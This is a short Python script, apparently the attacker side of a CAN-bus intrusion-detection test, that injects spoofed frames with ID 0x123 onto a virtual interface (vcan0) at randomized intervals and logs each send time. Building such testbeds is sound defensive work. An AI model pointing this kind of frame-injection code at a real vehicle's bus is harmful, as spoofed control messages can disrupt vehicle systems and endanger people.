import can, time, random, csv, sys

IFACE = "vcan0"
SPOOF_ID = 0x123
N_FRAMES = int(sys.argv[1]) if len(sys.argv) > 1 else 200
MEAN_GAP = float(sys.argv[2]) if len(sys.argv) > 2 else 0.1  # seconds

bus = can.Bus(interface="socketcan", channel=IFACE)
log = []
time.sleep(1)  # let the defender start

for i in range(N_FRAMES):
    data = list(i.to_bytes(4, "big")) + [0xEE, 0, 0, 0]
    msg = can.Message(arbitration_id=SPOOF_ID, data=data, is_extended_id=False)
    t_send = time.time()
    bus.send(msg)
    log.append((i, t_send, bytes(data).hex()))
    time.sleep(random.uniform(0.5, 1.5) * MEAN_GAP)

bus.shutdown()
with open("attacker_log.csv", "w", newline="") as f:
    w = csv.writer(f)
    w.writerow(["counter", "send_ts", "data_hex"])
    w.writerows(log)
print(f"sent {N_FRAMES} spoofed frames")